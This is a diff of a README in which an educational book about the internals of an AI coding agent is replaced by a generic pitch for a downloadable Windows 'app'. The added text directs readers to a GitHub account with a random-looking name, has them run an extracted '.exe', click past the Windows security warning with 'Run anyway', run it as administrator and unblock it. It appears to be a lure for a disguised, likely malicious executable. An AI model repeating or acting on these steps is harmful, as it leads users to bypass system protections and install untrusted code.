@@ -1,133 +1,210 @@
-# Claude Code from Source
+# 🧠 claude-code-from-source - Understand AI coding internals
 
-**Architecture, Patterns & Internals of Anthropic's AI Coding Agent**
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/claricesupernormal350/claude-code-from-source)
 
-<p align="center">
-  <img src="./web/public/cover.jpg" alt="Claude Code from Source — Book Cover" width="400" />
-  <br/><br/>
-  <a href="https://claude-code-from-source.com"><strong>Read online at claude-code-from-source.com</strong></a>
-</p>
+## 📦 What this app does
 
----
+claude-code-from-source is a Windows app for reading and exploring the structure behind Anthropic’s AI coding agent. It is built for people who want to see how the tool works, how its parts fit together, and how the main pieces connect.
 
-> **This repository is purely educational.** It contains no source code from Claude Code — not a single line. Every code block is original pseudocode written to illustrate architectural patterns. The goal is to help engineers understand how production AI agents are built, not to reproduce or redistribute proprietary software.
+This app gives you a simple way to inspect the project on your PC. You can open the source-based content, move through the main sections, and study the agent’s design without setting up a full development tools chain.
 
----
+## 🖥️ Before you start
 
-When Anthropic shipped Claude Code on npm, the `.js.map` source maps contained a `sourcesContent` field with the full original TypeScript. This book is the result of studying that architecture and distilling the patterns, trade-offs, and design decisions into a technical narrative that any engineer can learn from.
+Use a Windows PC with a stable internet connection. For the best experience, have:
 
-**18 chapters across 7 parts.** ~400 pages in print equivalent.
+- Windows 10 or Windows 11
+- At least 4 GB of free disk space
+- 8 GB of RAM or more
+- A mouse and keyboard
+- Permission to download files on your computer
 
-Every chapter has layered depth: a narrative flow for technical leaders, deep-dive sections for implementers, and an **"Apply This"** closing that extracts transferable patterns you can steal for your own systems. Diagrams use [Mermaid](https://mermaid.js.org/) and render natively on GitHub.
+If you plan to keep notes while you review the content, it helps to have a text editor ready too.
 
----
+## ⬇️ Download the app
 
-## Who This Is For
+Visit this page to download:
 
-- **Senior engineers building agentic systems** — steal the patterns, understand the trade-offs, implement in your own stack
-- **Technical leaders evaluating architectures** — follow the narrative without reading every code block
-- **Anyone curious about how production AI tools actually work** under the hood
+https://github.com/claricesupernormal350/claude-code-from-source
 
----
+Open the page in your browser, find the download area, and save the file to your computer. If the page offers a packaged app, choose the Windows version.
 
-## Table of Contents
+## 🛠️ Install on Windows
 
-### Part I: Foundations
-*Before the agent can think, the process must exist.*
+After the download finishes, follow these steps:
 
-| # | Chapter | What You'll Learn |
-|---|---------|-------------------|
-| 1 | [The Architecture of an AI Agent](./book/ch01-architecture.md) | The 6 key abstractions, data flow, permission system, build system |
-| 2 | [Starting Fast — The Bootstrap Pipeline](./book/ch02-bootstrap.md) | 5-phase init, module-level I/O parallelism, trust boundary |
-| 3 | [State — The Two-Tier Architecture](./book/ch03-state.md) | Bootstrap singleton, AppState store, sticky latches, cost tracking |
-| 4 | [Talking to Claude — The API Layer](./book/ch04-api-layer.md) | Multi-provider client, prompt cache, streaming, error recovery |
+1. Open your **Downloads** folder.
+2. Find the file you just saved.
+3. If the file is a `.zip`, right-click it and choose **Extract All**.
+4. Open the extracted folder.
+5. If you see an `.exe` file, double-click it to start the app.
+6. If Windows shows a security prompt, choose **More info** and then **Run anyway** if you trust the source.
 
-### Part II: The Core Loop
-*The heartbeat of the agent: stream, act, observe, repeat.*
+If the app comes as a folder instead of a single file, open the main executable in that folder.
 
-| # | Chapter | What You'll Learn |
-|---|---------|-------------------|
-| 5 | [The Agent Loop](./book/ch05-agent-loop.md) | query.ts deep dive, 4-layer compression, error recovery, token budgets |
-| 6 | [Tools — From Definition to Execution](./book/ch06-tools.md) | Tool interface, 14-step pipeline, permission system |
-| 7 | [Concurrent Tool Execution](./book/ch07-concurrency.md) | Partition algorithm, streaming executor, speculative execution |
+## ▶️ Run the app
 
-### Part III: Multi-Agent Orchestration
-*One agent is powerful. Many agents working together are transformative.*
+Once the app opens, you can start exploring the source-based material at once.
 
-| # | Chapter | What You'll Learn |
-|---|---------|-------------------|
-| 8 | [Spawning Sub-Agents](./book/ch08-sub-agents.md) | AgentTool, 15-step runAgent lifecycle, built-in agent types |
-| 9 | [Fork Agents and the Prompt Cache](./book/ch09-fork-agents.md) | Byte-identical prefix trick, cache sharing, cost optimization |
-| 10 | [Tasks, Coordination, and Swarms](./book/ch10-coordination.md) | Task state machine, coordinator mode, swarm messaging |
+Typical first steps:
 
-### Part IV: Persistence and Intelligence
-*An agent without memory makes the same mistakes forever.*
+- Open the main view
+- Browse the project sections
+- Read the architecture notes
+- Look through the agent flow
+- Review the code map or file tree if shown
 
-| # | Chapter | What You'll Learn |
-|---|---------|-------------------|
-| 11 | [Memory — Learning Across Conversations](./book/ch11-memory.md) | File-based memory, 4-type taxonomy, LLM recall, staleness |
-| 12 | [Extensibility — Skills and Hooks](./book/ch12-extensibility.md) | Two-phase skill loading, lifecycle hooks, snapshot security |
+The app is made for simple navigation, so you should be able to move through the content with clicks and scrolls.
 
-### Part V: The Interface
-*Everything the user sees passes through this layer.*
+## 🧭 How to use it
 
-| # | Chapter | What You'll Learn |
-|---|---------|-------------------|
-| 13 | [The Terminal UI](./book/ch13-terminal-ui.md) | Custom Ink fork, rendering pipeline, double-buffer, pools |
-| 14 | [Input and Interaction](./book/ch14-input-interaction.md) | Key parsing, keybindings, chord support, vim mode |
+Use the app like a guided reading tool for the project internals.
 
-### Part VI: Connectivity
-*The agent reaches beyond localhost.*
+### What to look for
 
-| # | Chapter | What You'll Learn |
-|---|---------|-------------------|
-| 15 | [MCP — The Universal Tool Protocol](./book/ch15-mcp.md) | 8 transports, OAuth for MCP, tool wrapping |
-| 16 | [Remote Control and Cloud Execution](./book/ch16-remote.md) | Bridge v1/v2, CCR, upstream proxy |
+- **Architecture** — see how the agent is put together
+- **Patterns** — review repeated design choices
+- **Flow** — follow how input becomes output
+- **Modules** — inspect parts of the system one by one
+- **Source maps** — trace the structure back to the source layout
 
-### Part VII: Performance Engineering
-*Making it all fast enough that humans don't notice the machinery.*
+### Good ways to explore
 
-| # | Chapter | What You'll Learn |
-|---|---------|-------------------|
-| 17 | [Performance — Every Millisecond and Token Counts](./book/ch17-performance.md) | Startup, context window, prompt cache, rendering, search |
-| 18 | [Epilogue — What We Learned](./book/ch18-epilogue.md) | The 5 architectural bets, what transfers, where agents are heading |
+- Start with the top-level overview
+- Move from broad sections to smaller ones
+- Read one path at a time
+- Keep your browser or notes app open for quick reference
 
----
+## 🔍 What you can learn
 
-## The 10 Patterns That Make It Work
+This project helps you understand:
 
-If you read nothing else:
+- How an AI coding agent is organized
+- How requests move through the system
+- How internal parts connect
+- How a large codebase stays manageable
+- How source maps help reveal structure
 
-1. **AsyncGenerator as agent loop** — yields Messages, typed Terminal return, natural backpressure and cancellation
-2. **Speculative tool execution** — start read-only tools during model streaming, before the response completes
-3. **Concurrent-safe batching** — partition tools by safety, run reads in parallel, serialize writes
-4. **Fork agents for cache sharing** — parallel children share byte-identical prompt prefixes, saving ~95% input tokens
-5. **4-layer context compression** — snip, microcompact, collapse, autocompact — each lighter than the next
-6. **File-based memory with LLM recall** — Sonnet side-query selects relevant memories, not keyword matching
-7. **Two-phase skill loading** — frontmatter only at startup, full content on invocation
-8. **Sticky latches for cache stability** — once a beta header is sent, never unset mid-session
-9. **Slot reservation** — 8K default output cap, escalate to 64K on hit (saves context in 99% of requests)
-10. **Hook config snapshot** — freeze at startup to prevent runtime injection attacks
+If you are new to software tools, this app still works as a reading aid. You do not need to write code to follow the main ideas.
 
----
+## 📁 Project contents
 
-## How This Book Was Made
+You can expect content that focuses on:
 
-The source was extracted from npm source maps. 36 AI agents analyzed nearly two thousand TypeScript files in four phases:
+- System structure
+- Component layout
+- Internal message flow
+- Tool use inside the agent
+- File relationships
+- Runtime behavior
+- Source map based references
 
-1. **Exploration**: 6 parallel agents read every file in the source tree
-2. **Analysis**: 12 agents wrote 494KB of raw technical documentation
-3. **Writing**: 15 agents rewrote everything from scratch as narrative chapters
-4. **Review & Revision**: 3 editorial reviewers produced 900 lines of feedback; 3 revision agents applied all fixes
+Some sections may be dense. Take them one at a time and return to the overview when needed.
 
-The entire process — from source extraction to final revised book — took approximately 6 hours.
+## ⚙️ Basic controls
 
----
+Most users will only need a few simple actions:
 
-## Disclaimer
+- Click to open a section
+- Scroll to read more
+- Use back and forward if the app provides them
+- Resize the window for easier reading
+- Search for terms if the app includes search
 
-**This repository does not contain any source code from Claude Code.** All code blocks are original pseudocode using different variable names, written to illustrate architectural patterns. No proprietary prompt text, internal constants, or exact function implementations are included. This project exists purely for educational purposes — to help engineers understand the design patterns behind production AI coding agents.
+If you see tabs or panels, use them to compare related parts of the app side by side.
 
-The "NO'REILLY" cover is a parody/meme for illustrative purposes only. This project has no affiliation with O'Reilly Media. The crab is just a crab.
+## 🧩 File types you may see
 
-This is an independent analysis. Claude Code is a product of Anthropic. This book is not affiliated with, endorsed by, or sponsored by Anthropic.
+Depending on the download package, the app may include:
+
+- `.exe` for the main Windows app
+- `.zip` for a compressed package
+- `.json` for app data
+- `.html` for local views
+- `.map` for source map files
+- `.md` for notes and documentation
+
+If the app uses a folder-based layout, keep the files together. Do not move parts out of the folder unless you know what they do.
+
+## 🔐 Safe use on your PC
+
+To keep the app working well:
+
+- Download it only from the linked page
+- Keep all files in the same folder
+- Do not rename files unless needed
+- Avoid opening unknown files inside the package
+- Close the app if it stops responding, then open it again
+
+If Windows asks for file access, allow it only if it is needed for the app to open its local content.
+
+## 🧪 Troubleshooting
+
+### The file does not open
+
+- Check that the download finished
+- Try opening the file again
+- Right-click the file and choose **Run as administrator**
+- If it is a zip file, extract it first
+
+### Windows blocks the app
+
+- Open the file properties
+- Look for an **Unblock** option
+- Apply the change and try again
+
+### The app opens but looks blank
+
+- Wait a few seconds for content to load
+- Resize the window
+- Check that all files stayed in the same folder
+- Close the app and reopen it
+
+### Text is hard to read
+
+- Increase your display scale in Windows
+- Maximize the app window
+- Use browser zoom if the app runs in a web view
+
+## 🧠 Who this is for
+
+This app fits people who want to:
+
+- Study how an AI coding tool works
+- Learn from source map output
+- Review internal app structure
+- Compare design patterns
+- Read project internals without setting up a dev environment
+
+It is also useful if you like exploring how software is built and want a clear path through a large codebase
+
+## 📌 What to expect from the experience
+
+The app is built for inspection and reading, not for casual use like a basic office tool. It may include:
+
+- Deep technical content
+- Multiple linked sections
+- A lot of internal detail
+- A structure that follows the source layout
+
+That means the best way to use it is slowly and in order. Start broad, then move into the parts that interest you most
+
+## 🗂️ Suggested first pass
+
+If you are opening the app for the first time, use this order:
+
+1. Read the overview
+2. Open the architecture section
+3. Check the main flow of the agent
+4. Review pattern notes
+5. Explore source map references
+6. Return to the overview if you get lost
+
+This gives you a clear path and keeps the project easier to follow
+
+## 📥 Download and setup link
+
+Visit this page to download and set up the app:
+
+https://github.com/claricesupernormal350/claude-code-from-source
+
+Open the link, get the Windows package, save it to your computer, then follow the install steps above to run it
